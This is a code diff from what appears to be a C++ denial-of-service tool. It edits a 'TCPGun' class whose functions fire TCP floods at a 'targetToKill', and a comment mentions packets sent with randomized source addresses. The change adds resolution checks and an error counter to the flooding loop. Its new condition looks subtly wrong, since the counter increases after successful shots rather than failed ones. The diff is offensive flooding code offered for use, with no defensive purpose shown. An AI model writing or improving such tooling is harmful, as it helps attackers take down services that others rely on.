@@ -27,15 +27,21 @@ std::size_t TCPGun::FireTillDead(const URI &targetToKill) noexcept
 bool TCPGun::FireWithoutProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept
 {
 	// Checking connectivity over proxy, because packets would be send with randomized source
+	const auto resolvedAddress{m_attacker.TryResolveAddress(targetToKill, {})};
+	if(!resolvedAddress)
+	{
+		SPDLOG_WARN("Cannot resolve {} address", targetToKill);
+		return false;
+	}
 
-	auto resolvedAddress{m_attacker.TryResolveAddress(targetToKill, {})};
+	std::size_t errorsCount{0};
 	while(!m_currentTask.ShouldStop())
 	{
-		// TODO: add error counter and optimize out
-		// so much adress resolving calls
-		if(resolvedAddress && ShootTarget(*resolvedAddress, hitsCount))
+		if(!resolvedAddress || !ShootTarget(*resolvedAddress, hitsCount) ||
+			++errorsCount > AttackerConfig::TCPAttacker::MAX_ERRORS_BEFORE_CHECK)
 		{
-			resolvedAddress = m_attacker.TryResolveAddress(targetToKill, {});
+			SPDLOG_WARN("Too many errors emited on TCP flooding, leaving");
+			return false;
 		}
 	}
 	return false;
